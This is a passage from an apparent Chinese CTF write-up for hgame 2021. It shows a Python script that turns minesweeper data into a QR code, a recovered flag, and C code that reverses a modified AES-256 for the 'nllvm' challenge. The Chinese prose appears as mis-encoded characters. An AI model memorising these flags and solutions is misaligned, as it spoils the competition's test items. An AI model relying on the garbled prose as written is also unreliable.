class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”¨è¿™ä¸ªæ•°æ®ç©äº†ä¸€ä¸‹æ¸¸æˆï¼Œä½†æ˜¯æœ‰çš„åœ°æ–¹å’Œç®—å‡ºçš„é›·çš„ä½ç½®ä¸ä¸€è‡´ï¼Œå¤§å¤šæ•°è¿˜æ˜¯ä¸€æ ·çš„ã€‚ã€‚ç„¶åä¸€ç›´æ‰¾æ˜¯ä¸æ˜¯å“ªé‡Œç®—é”™äº†ï¼Œç®—æ³•ä¹Ÿæ¯”å¯¹äº†å¥½å‡ æ¬¡ã€‚ã€‚å°±æŠŠé¢˜æ”¾ä¸€è¾¹äº†ã€‚</p><p>åé¢çœ‹è§é¢˜ç›®ç»™å‡ºæç¤ºï¼ŒäºŒç»´ç ï¼Œçœ‹äº†çœ‹æˆ‘ä¹‹å‰æ‰“å°çš„æ•°æ®ã€‚ã€‚ã€‚</p><p><img src="https://i.loli.net/2021/02/27/iQqyeAYgFaJVoMc.png" alt="image-20210227020942288"></p><p>ä½¿ç”¨pythonçš„PILæ¨¡å—ç”¨è¿™ä¸ªæ•°æ®æ‰“å°å‡ºäºŒç»´ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">x = <span class="number">45</span></span><br><span class="line">y = <span class="number">45</span></span><br><span class="line"></span><br><span class="line">im = Image.new(<span class="string">'RGB'</span>, (x, y))</span><br><span class="line">data = <span class="string">'111111100011101111100101000001110100101111111100000100001011111010001110100011001001000001101110101110100100000100111010100101001011101101110101101010111001001001001111101101011101101110101110001100101111111011101111101011101100000101011000100101000100011111000001000001111111101010101010101010101010101010101111111000000001100001101111000111101010000100000000101111100001111010101111111000000000101111100000100010001011011110010110001010001010000001000101111000011001000111010110100010011001110010100001000010001111010011000100111000001100100110101111100101101101010101110010010101001010001011101001011011101100000101101110000110010000111101101001010000100101110010010101100101111011101101110000101111101101101000100110110100101000010101010000101010100001110011100000010001001001000100010111111101101100111000011110100010000010100111000011011001010010011000001010101101011111000000101010011011011001011111111100110100101111110001000110111110111111110001100000011111000100011110010100011101001010101001011101011010110010000101101011010101110001100001010011000110010100011100011100001111111101110011011111110001111110111110001111110011111001100101101000010101001001101001100100110100111010001011001011111111011110010010011001000011110111111111101001000100011111011001111110011100011010101010010100001111000011011011001000001000100011111010000111001000100100101001100110001101100010111110010000011011101010111101010100000100001101011010011001110011100010111111000101110101110110010100111001110010111010001101000100001110010100010110000010111111000000010010110100110101110111100011110011101001101111111011001100100011010110100110100011100010011111101000111000111111100000000001110101000011000111001101101100010100111111100101011000101010100000011000101011110100000101100000110101000111001010110100011111101110101111001110001111110000000101111110000101110101111010011010010010011010001111001111101110101110100010000101010010100100101101100100000100111010110100001100000101111111001100111111101000101001110100110101100000100100010'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, y):</span><br><span class="line">        line = data[i*x+j]</span><br><span class="line">        <span class="keyword">if</span> line == <span class="string">'1'</span>:</span><br><span class="line">            im.putpixel((i, j), (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            im.putpixel((i, j), (<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>))</span><br><span class="line">im.show()</span><br></pre></td></tr></table></figure><p>æ‰«ä¸€ä¸‹å¾—åˆ°flagï¼š<strong>hgame{YOU<del>hEn-duO_yOU-X|</del>DOU-sHi<del>un1Ty</del>k4i-fA_de_O}</strong></p><h3 id="nllvm"><a href="#nllvm" class="headerlink" title="nllvm"></a>nllvm</h3><p>ä¸€è¡€ã€‚</p><p>é€šè¿‡è¿™ä¸ªé¢˜å­¦ä¹ ç†Ÿæ‚‰ä¸‹AESåŠ å¯†ç®—æ³•è¿˜æ˜¯ä¸é”™çš„ã€‚</p><p>é¦–å…ˆçœ‹ä¸€ä¸‹mainå‡½æ•°ï¼šå…ˆè®¾ç½®æ§åˆ¶å°æ˜¾ç¤ºæ–‡æœ¬çš„å±æ€§ï¼Œæ¥ç€å¯ä»¥çœ‹åˆ°å¾ˆå¤šå¼‚æˆ–è¿ç®—ï¼Œè¿™äº›æ•°æ®åœ¨è¦ä½¿ç”¨ååŒæ ·åšäº†ç›¸åŒçš„å¼‚æˆ–è¿ç®—ï¼Œæ‰€ä»¥ç®€å•éšè—äº†ä¸‹ç¨‹åºä¸­çš„æ•°æ®ã€‚</p><p><img src="https://i.loli.net/2021/02/27/p7NOiGZoXHwMrKW.png" alt="image-20210223230432003"></p><p>æ‰¾åˆ°åŠ å¯†çš„åœ°æ–¹ï¼Œå¼€å§‹é™æ€çœ‹äº†ä¸€ä¸‹æ•´ä¸ªåŠ å¯†æµç¨‹ï¼Œåªæ˜¯æ³¨æ„åˆ°å¾ˆå¤šå¼‚æˆ–è¿ç®—ä¹Ÿä¸å¤æ‚ï¼Œåœ¨ä¸€ä¸ªç½®ä½çš„åœ°æ–¹å‘ç°åŠ å¯†åçš„ä¸€ä¸ªaesçš„s-boxã€‚</p><p>ç¡®å®šaesåŠ å¯†åï¼Œåˆè¿›è€Œå‘ç°æ˜¯å¸¦æœ‰ivçš„ã€‚</p><p><img src="https://i.loli.net/2021/02/27/cpix3L91BESXuGe.png" alt="image-20210223231923153"></p><p>å†æ¢³ç†äº†ä¸€ä¸‹è¿™é‡Œçš„åŠ å¯†æµç¨‹ï¼š</p><p><img src="https://i.loli.net/2021/02/27/WRM9vQi1HZD8O7e.png" alt="image-20210223233754450"></p><p>å¯ä»¥ä»é‡å¤è½®è¿›è¡Œäº†13æ¬¡å¯ä»¥çŸ¥é“keyæ˜¯256ä½çš„ï¼Œä½†å—é•¿åº¦æ˜¯128ä½çš„ã€‚ã€‚ä¹‹å‰ä¸€ç›´ä»¥ä¸ºå¯†é’¥é•¿åº¦å’Œå—é•¿åº¦æ˜¯ä¸€æ ·çš„ã€‚åˆåŠ ä¸Šè¿™é‡Œç§»ä½å’Œæ··åˆçš„æ–¹å‘å’Œæˆ‘ä¹‹å‰äº†è§£çš„æ­£å¥½ç›¸åï¼Œå°±æ„Ÿè§‰æ˜¯é­”æ”¹è¿‡çš„aesåŠ å¯†ï¼Œå¼€å§‹ç”¨Cè‡ªå·±å†™é€†è¿‡ç¨‹ï¼Œå…³é”®å°±æ˜¯è¡Œæ··åˆä¸å¥½å†™ï¼Œè¿˜å¥½æœ‰æœç´¢ï¼Œhhã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> rsbox[<span class="number">256</span>] = &#123;</span><br><span class="line">  <span class="number">0x52</span>, <span class="number">0x09</span>, <span class="number">0x6a</span>, <span class="number">0xd5</span>, <span class="number">0x30</span>, <span class="number">0x36</span>, <span class="number">0xa5</span>, <span class="number">0x38</span>, <span class="number">0xbf</span>, <span class="number">0x40</span>, <span class="number">0xa3</span>, <span class="number">0x9e</span>, <span class="number">0x81</span>, <span class="number">0xf3</span>, <span class="number">0xd7</span>, <span class="number">0xfb</span>,</span><br><span class="line">  <span class="number">0x7c</span>, <span class="number">0xe3</span>, <span class="number">0x39</span>, <span class="number">0x82</span>, <span class="number">0x9b</span>, <span class="number">0x2f</span>, <span class="number">0xff</span>, <span class="number">0x87</span>, <span class="number">0x34</span>, <span class="number">0x8e</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0xc4</span>, <span class="number">0xde</span>, <span class="number">0xe9</span>, <span class="number">0xcb</span>,</span><br><span class="line">  <span class="number">0x54</span>, <span class="number">0x7b</span>, <span class="number">0x94</span>, <span class="number">0x32</span>, <span class="number">0xa6</span>, <span class="number">0xc2</span>, <span class="number">0x23</span>, <span class="number">0x3d</span>, <span class="number">0xee</span>, <span class="number">0x4c</span>, <span class="number">0x95</span>, <span class="number">0x0b</span>, <span class="number">0x42</span>, <span class="number">0xfa</span>, <span class="number">0xc3</span>, <span class="number">0x4e</span>,</span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x2e</span>, <span class="number">0xa1</span>, <span class="number">0x66</span>, <span class="number">0x28</span>, <span class="number">0xd9</span>, <span class="number">0x24</span>, <span class="number">0xb2</span>, <span class="number">0x76</span>, <span class="number">0x5b</span>, <span class="number">0xa2</span>, <span class="number">0x49</span>, <span class="number">0x6d</span>, <span class="number">0x8b</span>, <span class="number">0xd1</span>, <span class="number">0x25</span>,</span><br><span class="line">  <span class="number">0x72</span>, <span class="number">0xf8</span>, <span class="number">0xf6</span>, <span class="number">0x64</span>, <span class="number">0x86</span>, <span class="number">0x68</span>, <span class="number">0x98</span>, <span class="number">0x16</span>, <span class="number">0xd4</span>, <span class="number">0xa4</span>, <span class="number">0x5c</span>, <span class="number">0xcc</span>, <span class="number">0x5d</span>, <span class="number">0x65</span>, <span class="number">0xb6</span>, <span class="number">0x92</span>,</span><br><span class="line">  <span class="number">0x6c</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x50</span>, <span class="number">0xfd</span>, <span class="number">0xed</span>, <span class="number">0xb9</span>, <span class="number">0xda</span>, <span class="number">0x5e</span>, <span class="number">0x15</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0xa7</span>, <span class="number">0x8d</span>, <span class="number">0x9d</span>, <span class="number">0x84</span>,</span><br><span class="line">  <span class="number">0x90</span>, <span class="number">0xd8</span>, <span class="number">0xab</span>, <span class="number">0x00</span>, <span class="number">0x8c</span>, <span class="number">0xbc</span>, <span class="number">0xd3</span>, <span class="number">0x0a</span>, <span class="number">0xf7</span>, <span class="number">0xe4</span>, <span class="number">0x58</span>, <span class="number">0x05</span>, <span class="number">0xb8</span>, <span class="number">0xb3</span>, <span class="number">0x45</span>, <span class="number">0x06</span>,</span><br><span class="line">  <span class="number">0xd0</span>, <span class="number">0x2c</span>, <span class="number">0x1e</span>, <span class="number">0x8f</span>, <span class="number">0xca</span>, <span class="number">0x3f</span>, <span class="number">0x0f</span>, <span class="number">0x02</span>, <span class="number">0xc1</span>, <span class="number">0xaf</span>, <span class="number">0xbd</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x13</span>, <span class="number">0x8a</span>, <span class="number">0x6b</span>,</span><br><span class="line">  <span class="number">0x3a</span>, <span class="number">0x91</span>, <span class="number">0x11</span>, <span class="number">0x41</span>, <span class="number">0x4f</span>, <span class="number">0x67</span>, <span class="number">0xdc</span>, <span class="number">0xea</span>, <span class="number">0x97</span>, <span class="number">0xf2</span>, <span class="number">0xcf</span>, <span class="number">0xce</span>, <span class="number">0xf0</span>, <span class="number">0xb4</span>, <span class="number">0xe6</span>, <span class="number">0x73</span>,</span><br><span class="line">  <span class="number">0x96</span>, <span class="number">0xac</span>, <span class="number">0x74</span>, <span class="number">0x22</span>, <span class="number">0xe7</span>, <span class="number">0xad</span>, <span class="number">0x35</span>, <span class="number">0x85</span>, <span class="number">0xe2</span>, <span class="number">0xf9</span>, <span class="number">0x37</span>, <span class="number">0xe8</span>, <span class="number">0x1c</span>, <span class="number">0x75</span>, <span class="number">0xdf</span>, <span class="number">0x6e</span>,</span><br><span class="line">  <span class="number">0x47</span>, <span class="number">0xf1</span>, <span class="number">0x1a</span>, <span class="number">0x71</span>, <span class="number">0x1d</span>, <span class="number">0x29</span>, <span class="number">0xc5</span>, <span class="number">0x89</span>, <span class="number">0x6f</span>, <span class="number">0xb7</span>, <span class="number">0x62</span>, <span class="number">0x0e</span>, <span class="number">0xaa</span>, <span class="number">0x18</span>, <span class="number">0xbe</span>, <span class="number">0x1b</span>,</span><br><span class="line">  <span class="number">0xfc</span>, <span class="number">0x56</span>, <span class="number">0x3e</span>, <span class="number">0x4b</span>, <span class="number">0xc6</span>, <span class="number">0xd2</span>, <span class="number">0x79</span>, <span class="number">0x20</span>, <span class="number">0x9a</span>, <span class="number">0xdb</span>, <span class="number">0xc0</span>, <span class="number">0xfe</span>, <span class="number">0x78</span>, <span class="number">0xcd</span>, <span class="number">0x5a</span>, <span class="number">0xf4</span>,</span><br><span class="line">  <span class="number">0x1f</span>, <span class="number">0xdd</span>, <span class="number">0xa8</span>, <span class="number">0x33</span>, <span class="number">0x88</span>, <span class="number">0x07</span>, <span class="number">0xc7</span>, <span class="number">0x31</span>, <span class="number">0xb1</span>, <span class="number">0x12</span>, <span class="number">0x10</span>, <span class="number">0x59</span>, <span class="number">0x27</span>, <span class="number">0x80</span>, <span class="number">0xec</span>, <span class="number">0x5f</span>,</span><br><span class="line">  <span class="number">0x60</span>, <span class="number">0x51</span>, <span class="number">0x7f</span>, <span class="number">0xa9</span>, <span class="number">0x19</span>, <span class="number">0xb5</span>, <span class="number">0x4a</span>, <span class="number">0x0d</span>, <span class="number">0x2d</span>, <span class="number">0xe5</span>, <span class="number">0x7a</span>, <span class="number">0x9f</span>, <span class="number">0x93</span>, <span class="number">0xc9</span>, <span class="number">0x9c</span>, <span class="number">0xef</span>,</span><br><span class="line">  <span class="number">0xa0</span>, <span class="number">0xe0</span>, <span class="number">0x3b</span>, <span class="number">0x4d</span>, <span class="number">0xae</span>, <span class="number">0x2a</span>, <span class="number">0xf5</span>, <span class="number">0xb0</span>, <span class="number">0xc8</span>, <span class="number">0xeb</span>, <span class="number">0xbb</span>, <span class="number">0x3c</span>, <span class="number">0x83</span>, <span class="number">0x53</span>, <span class="number">0x99</span>, <span class="number">0x61</span>,</span><br><span class="line">  <span class="number">0x17</span>, <span class="number">0x2b</span>, <span class="number">0x04</span>, <span class="number">0x7e</span>, <span class="number">0xba</span>, <span class="number">0x77</span>, <span class="number">0xd6</span>, <span class="number">0x26</span>, <span class="number">0xe1</span>, <span class="number">0x69</span>, <span class="number">0x14</span>, <span class="number">0x63</span>, <span class="number">0x55</span>, <span class="number">0x21</span>, <span class="number">0x0c</span>, <span class="number">0x7d</span> &#125;;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> key[] = &#123;<span class="number">0x43</span>, <span class="number">0x72</span>, <span class="number">0x79</span>, <span class="number">0x70</span>, <span class="number">0x74</span>, <span class="number">0x6f</span>, <span class="number">0x46</span>, <span class="number">0x41</span>, <span class="number">0x49</span>, <span class="number">0x4c</span>, <span class="number">0x55</span>, <span class="number">0x52</span>, <span class="number">0x45</span>, <span class="number">0x66</span>, <span class="number">0x6f</span>, <span class="number">0x72</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x41</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0x34</span>, <span class="number">0x38</span>, <span class="number">0x4b</span>, <span class="number">0x65</span>, <span class="number">0x79</span>, <span class="number">0x21</span>, <span class="number">0x21</span>, <span class="number">0x21</span>, <span class="number">0x21</span>, <span class="number">0x21</span>, <span class="number">0x21</span>, <span class="number">0xbf</span>, <span class="number">0x8f</span>, <span class="number">0x84</span>, <span class="number">0x8d</span>, <span class="number">0xcb</span>, <span class="number">0xe0</span>, <span class="number">0xc2</span>, <span class="number">0xcc</span>, <span class="number">0x82</span>, <span class="number">0xac</span>, <span class="number">0x97</span>, <span class="number">0x9e</span>, <span class="number">0xc7</span>, <span class="number">0xca</span>, <span class="number">0xf8</span>, <span class="number">0xec</span>, <span class="number">0x94</span>, <span class="number">0x27</span>, <span class="number">0x00</span>, <span class="number">0xfc</span>, <span class="number">0xa4</span>, <span class="number">0x13</span>, <span class="number">0x38</span>, <span class="number">0xb7</span>, <span class="number">0xc1</span>, <span class="number">0x6a</span>, <span class="number">0x19</span>, <span class="number">0x96</span>, <span class="number">0xe0</span>, <span class="number">0x4b</span>, <span class="number">0x38</span>, <span class="number">0xb7</span>, <span class="number">0x0e</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>, <span class="number">0x6c</span>, <span class="number">0xc5</span>, <span class="number">0x68</span>, <span class="number">0xef</span>, <span class="number">0xa0</span>, <span class="number">0x47</span>, <span class="number">0xc4</span>, <span class="number">0x78</span>, <span class="number">0x3e</span>, <span class="number">0x80</span>, <span class="number">0x0e</span>, <span class="number">0x80</span>, <span class="number">0xd2</span>, <span class="number">0x59</span>, <span class="number">0x8c</span>, <span class="number">0xcd</span>, <span class="number">0x49</span>, <span class="number">0xfd</span>, <span class="number">0x9f</span>, <span class="number">0xf5</span>, <span class="number">0xfe</span>, <span class="number">0x3c</span>, <span class="number">0xf5</span>, <span class="number">0xec</span>, <span class="number">0x68</span>, <span class="number">0xdc</span>, <span class="number">0xbe</span>, <span class="number">0xd4</span>, <span class="number">0xdf</span>, <span class="number">0xa4</span>, <span class="number">0xc0</span>, <span class="number">0xb3</span>, <span class="number">0xea</span>, <span class="number">0x61</span>, <span class="number">0xa8</span>, <span class="number">0x5c</span>, <span class="number">0x4a</span>, <span class="number">0x26</span>, <span class="number">0x6c</span>, <span class="number">0x24</span>, <span class="number">0x74</span>, <span class="number">0xa6</span>, <span class="number">0x62</span>, <span class="number">0xa4</span>, <span class="number">0xa6</span>, <span class="number">0x7d</span>, <span class="number">0x26</span>, <span class="number">0x84</span>, <span class="number">0x6d</span>, <span class="number">0x80</span>, <span class="number">0xb9</span>, <span class="number">0x71</span>, <span class="number">0x93</span>, <span class="number">0xbc</span>, <span class="number">0x4c</span>, <span class="number">0x9d</span>, <span class="number">0xfb</span>, <span class="number">0x60</span>, <span class="number">0xf2</span>, <span class="number">0x49</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0xfb</span>, <span class="number">0x85</span>, <span class="number">0x3a</span>, <span class="number">0x44</span>, <span class="number">0x53</span>, <span class="number">0xd9</span>, <span class="number">0x70</span>, <span class="number">0x62</span>, <span class="number">0x3f</span>, <span class="number">0xfd</span>, <span class="number">0x04</span>, <span class="number">0xc4</span>, <span class="number">0x5d</span>, <span class="number">0x59</span>, <span class="number">0xa2</span>, <span class="number">0x61</span>, <span class="number">0x6a</span>, <span class="number">0x4f</span>, <span class="number">0x57</span>, <span class="number">0xe1</span>, <span class="number">0xd3</span>, <span class="number">0x3e</span>, <span class="number">0xc4</span>, <span class="number">0x5d</span>, <span class="number">0x9f</span>, <span class="number">0xa3</span>, <span class="number">0x3f</span>, <span class="number">0x3d</span>, <span class="number">0x6d</span>, <span class="number">0xea</span>, <span class="number">0x1b</span>, <span class="number">0x09</span>, <span class="number">0x7c</span>, <span class="number">0x2a</span>, <span class="number">0x1d</span>, <span class="number">0x4d</span>, <span class="number">0x2f</span>, <span class="number">0xf3</span>, <span class="number">0x6d</span>, <span class="number">0x2f</span>, <span class="number">0x10</span>, <span class="number">0x0e</span>, <span class="number">0x69</span>, <span class="number">0xeb</span>, <span class="number">0x4d</span>, <span class="number">0x57</span>, <span class="number">0xcb</span>, <span class="number">0x88</span>, <span class="number">0x89</span>, <span class="number">0x14</span>, <span class="number">0x48</span>, <span class="number">0x69</span>, <span class="number">0x5a</span>, <span class="number">0x2a</span>, <span class="number">0x8c</span>, <span class="number">0x34</span>, <span class="number">0xc5</span>, <span class="number">0x89</span>, <span class="number">0xb3</span>, <span class="number">0x09</span>, <span class="number">0xa8</span>, <span class="number">0x63</span>, <span class="number">0xa8</span>, <span class="number">0xeb</span>, <span class="number">0x87</span>, <span class="number">0xe8</span>, <span class="number">0x1c</span>, <span class="number">0xa6</span>, <span class="number">0xa8</span>, <span class="number">0x1b</span>, <span class="number">0x71</span>, <span class="number">0x89</span>, <span class="number">0xb8</span>, <span class="number">0x15</span>, <span class="number">0x18</span>, <span class="number">0x62</span>, <span class="number">0xf5</span>, <span class="number">0x42</span>, <span class="number">0xd3</span>, <span class="number">0x22</span>, <span class="number">0x6f</span>, <span class="number">0x38</span>, <span class="number">0x2e</span>, <span class="number">0x4b</span>, <span class="number">0x35</span>, <span class="number">0x12</span>, <span class="number">0xa2</span>, <span class="number">0x7f</span>, <span class="number">0xf0</span>, <span class="number">0x9b</span>, <span class="number">0x11</span>, <span class="number">0x76</span>, <span class="number">0x58</span>, <span class="number">0xf8</span>, <span class="number">0xb9</span>, <span class="number">0xc1</span>, <span class="number">0xc6</span>, <span class="number">0xbe</span>, <span class="number">0x24</span>, <span class="number">0x67</span>, <span class="number">0x6e</span>, <span class="number">0xa5</span>, <span class="number">0x55</span>, <span class="number">0xee</span>, <span class="number">0xd6</span>, <span class="number">0xb0</span>, <span class="number">0x4d</span>, <span class="number">0x8c</span>, <span class="number">0x23</span>, <span class="number">0xf2</span>, <span class="number">0x9e</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0a</span>, <span class="number">0x0b</span>, <span class="number">0x0c</span>, <span class="number">0x0d</span>, <span class="number">0x0e</span>, <span class="number">0x0f</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="title">xtime</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ((x&lt;&lt;<span class="number">1</span>) ^ (((x&gt;&gt;<span class="number">7</span>) &amp; <span class="number">1</span>) * <span class="number">0x1b</span>))&amp;<span class="number">0xff</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="title">Multiply</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> x, <span class="keyword">unsigned</span> <span class="keyword">char</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (((y &amp; <span class="number">1</span>) * x) ^</span><br><span class="line">       ((y&gt;&gt;<span class="number">1</span> &amp; <span class="number">1</span>) * xtime(x)) ^</span><br><span class="line">       ((y&gt;&gt;<span class="number">2</span> &amp; <span class="number">1</span>) * xtime(xtime(x))) ^</span><br><span class="line">       ((y&gt;&gt;<span class="number">3</span> &amp; <span class="number">1</span>) * xtime(xtime(xtime(x)))) ^</span><br><span class="line">       ((y&gt;&gt;<span class="number">4</span> &amp; <span class="number">1</span>) * xtime(xtime(xtime(xtime(x)))))); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InvMixColumns</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> a, b, c, d;</span><br><span class="line">   </span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">  &#123; </span><br><span class="line">    a = state[<span class="number">4</span>*i];</span><br><span class="line">    b = state[<span class="number">4</span>*i+<span class="number">1</span>];</span><br><span class="line">    c = state[<span class="number">4</span>*i+<span class="number">2</span>];</span><br><span class="line">    d = state[<span class="number">4</span>*i+<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    state[<span class="number">4</span>*i] = Multiply(a, <span class="number">0x0e</span>) ^ Multiply(b, <span class="number">0x0b</span>) ^ Multiply(c, <span class="number">0x0d</span>) ^ Multiply(d, <span class="number">0x09</span>);</span><br><span class="line">    state[<span class="number">4</span>*i+<span class="number">1</span>] = Multiply(a, <span class="number">0x09</span>) ^ Multiply(b, <span class="number">0x0e</span>) ^ Multiply(c, <span class="number">0x0b</span>) ^ Multiply(d, <span class="number">0x0d</span>);</span><br><span class="line">    state[<span class="number">4</span>*i+<span class="number">2</span>] = Multiply(a, <span class="number">0x0d</span>) ^ Multiply(b, <span class="number">0x09</span>) ^ Multiply(c, <span class="number">0x0e</span>) ^ Multiply(d, <span class="number">0x0b</span>);</span><br><span class="line">    state[<span class="number">4</span>*i+<span class="number">3</span>] = Multiply(a, <span class="number">0x0b</span>) ^ Multiply(b, <span class="number">0x0d</span>) ^ Multiply(c, <span class="number">0x09</span>) ^ Multiply(d, <span class="number">0x0e</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun_xor</span><span class="params">(<span class="keyword">int</span> k, <span class="keyword">unsigned</span> <span class="keyword">char</span> *enc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">enc[i] ^= key[k*<span class="number">16</span> + i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InvShift</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">1</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> s = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(s &lt; j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> tmp = a1[<span class="number">4</span>*<span class="number">3</span>+j];</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">3</span>; i &gt; <span class="number">0</span>; i--)</span><br><span class="line">a1[<span class="number">4</span>*i+j] = a1[<span class="number">4</span>*(i<span class="number">-1</span>)+j];</span><br><span class="line">a1[j] = tmp;</span><br><span class="line">s++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InvSub</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; 